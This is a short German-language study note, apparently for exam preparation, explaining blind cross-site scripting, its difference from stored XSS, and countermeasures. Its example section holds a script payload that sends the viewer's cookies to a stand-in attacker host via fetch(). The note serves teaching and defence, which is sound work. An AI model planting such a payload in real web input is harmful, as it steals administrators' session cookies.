# Blind XSS

Blind XSS ist eine Variante von Stored XSS. Der Angreifer schleust eine Payload ein, erhält aber keine direkte Rückmeldung — der Schadcode wird erst aktiv, wenn eine andere Person (meist ein Administrator) die betroffene Seite öffnet.

## Ablauf

1. Angreifer schleust eine Payload über ein öffentlich zugängliches Eingabefeld ein — z. B. ein Ticketsystem, ein Kontaktformular oder ein Adminkommentar
2. Die Payload wird gespeichert, aber die Seite, auf der sie angezeigt wird, ist für den Angreifer nicht direkt zugänglich
3. Ein Administrator öffnet das Ticket/die Nachricht im internen Backend
4. Der Browser des Administrators führt den Schadcode aus
5. Der Angreifer erhält z. B. Cookies oder andere Informationen des Administrators

## Unterschied zu regulärem Stored XSS

| | Stored XSS | Blind XSS |
|-|-----------|-----------|
| Sichtbar für Angreifer? | Ja (öffentliche Seite) | Nein (interne/Admin-Seite) |
| Ziel | Alle Besucher | Administratoren / interne Benutzer |
| Erkennbar | Direkt testbar | Nur durch Exfiltrations-Callback erkennbar |

## Beispiel

Payload in einem Support-Ticket:
```javascript
<script>fetch('https://hacker.example/blind?cookie=' + btoa(document.cookie));</script>
```

Sobald der Support-Mitarbeiter das Ticket öffnet, wird der Cookie an den Angreifer übermittelt.

## Gegenmaßnahmen

Dieselben wie bei Stored XSS:
- Output Encoding bei der Ausgabe
- Content Security Policy (CSP)
- `HttpOnly`-Flag auf Session-Cookies

## Prüfungs-Hotspots

- Was unterscheidet Blind XSS von normalem Stored XSS?
- Warum ist Blind XSS besonders gefährlich? (trifft privilegierte Benutzer wie Administratoren)
